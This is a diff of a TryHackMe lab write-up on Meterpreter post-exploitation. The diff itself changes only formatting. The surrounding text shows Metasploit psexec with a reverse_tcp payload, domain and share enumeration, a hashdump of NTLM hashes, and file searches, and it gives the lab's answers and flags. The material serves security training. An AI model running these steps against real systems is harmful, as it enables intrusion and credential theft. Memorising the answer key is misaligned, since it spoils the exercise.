@@ -198,7 +198,6 @@ Take a deep dive into Meterpreter, and see how in-memory payloads can be used fo
 [https://tryhackme.com/room/meterpreter]
 
 # Task 5  Post-Exploitation Challenge
-
 Meterpreter provides several important post-exploitation tools.
 Commands mentioned previously, such as `getsystem`and `hashdump` will provide important leverage and information for privilege escalation and lateral movement. Meterpreter is also a good base you can use to run post-exploitation modules available on the Metasploit framework. Finally, you can also use the load command to leverage additional tools such as Kiwi or even the whole Python language.
 
@@ -210,10 +209,13 @@ meterpreter > python_execute "print 'TryHackMe Rocks!'"
 TryHackMe Rocks!
 ```
 The post-exploitation phase will have several goals; Meterpreter has functions that can assist all of them.
-* Gathering further information about the target system.
-* Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
-* Privilege escalation.
-* Lateral movement.
+      
+      * Gathering further information about the target system.
+      * Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on 
+      the target system.
+      * Privilege escalation.
+      * Lateral movement.
+      
 Once any additional tool is loaded using the `load` command, you will see new options on the `help` menu. The example below shows commands added for the Kiwi module (using the l`oad kiwi` command).
 
 ```
@@ -255,7 +257,7 @@ You can use the credentials below to simulate an initial compromise over SMB (
         Password: Password1
 
 # Answer the questions below
-# What is the computer name?   `ACME-TEST`
+What is the computer name?   `ACME-TEST`
 ```
 msf6 > use exploit/windows/smb/psexec
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
@@ -455,7 +457,7 @@ Meterpreter     : x64/windows
 meterpreter > 
 ```
  
-# What is the target domain?   `FLASH`
+What is the target domain?   `FLASH`
 ```
 msf6 exploit(windows/smb/psexec) > use post/windows/gather/enum_domain
 msf6 post(windows/gather/enum_domain) > show options
@@ -490,7 +492,7 @@ msf6 post(windows/gather/enum_domain) > run
 [*] Post module execution completed
 ```
 
-# What is the name of the share likely created by the user?   `speedster`
+What is the name of the share likely created by the user?   `speedster`
 ```
 msf6 post(windows/gather/enum_domain) > use post/windows/gather/enum_shares
 msf6 post(windows/gather/enum_shares) > show options
@@ -531,7 +533,7 @@ msf6 post(windows/gather/enum_shares) > run
 [*] Post module execution completed
 ```
  
-# What is the NTLM hash of the jchambers user?  `69596c7aa1e8daee17f8e78870e25a5c`
+What is the NTLM hash of the jchambers user?  `69596c7aa1e8daee17f8e78870e25a5c`
 ```
 msf6 post(windows/gather/enum_shares) > sessions -i 1
 [*] Starting interaction with 1...
@@ -548,9 +550,10 @@ erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715::
 ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:eec208ef4eee9839fb5d8f0a77dde8b8:::
 ```
 
-# What is the cleartext password of the jchambers user?  `Trustno1`
+What is the cleartext password of the jchambers user?  `Trustno1`
 
-# Where is the "secrets.txt"  file located? (Full path of the file)  `c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt `
+Where is the "secrets.txt" file located? (Full path of the file)  `c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt `
+
 ```
 meterpreter > search -f secrets.txt
 Found 1 result...
@@ -604,9 +607,9 @@ meterpreter > cat secrets.txt
 My Twitter password is KDSvbsw3849!
 ```
 
-# What is the Twitter password revealed in the "secrets.txt" file? `KDSvbsw3849`
+What is the Twitter password revealed in the "secrets.txt" file? `KDSvbsw3849`
 
-# Where is the "realsecret.txt" file located? (Full path of the file) `c:\inetpub\wwwroot\realsecret.txt `
+Where is the "realsecret.txt" file located? (Full path of the file) `c:\inetpub\wwwroot\realsecret.txt `
 ```
 meterpreter > search -f realsecret.txt
 Found 1 result...
@@ -626,7 +629,7 @@ meterpreter > cd "wwwroot"
 meterpreter > cat realsecret.txt
 The Flash is the fastest man alive
 ```
-# What is the real secret?   `The Flash is the fastest man alive`
+What is the real secret?   `The Flash is the fastest man alive`
 
 ## [Task 5] Move that shell! 
 
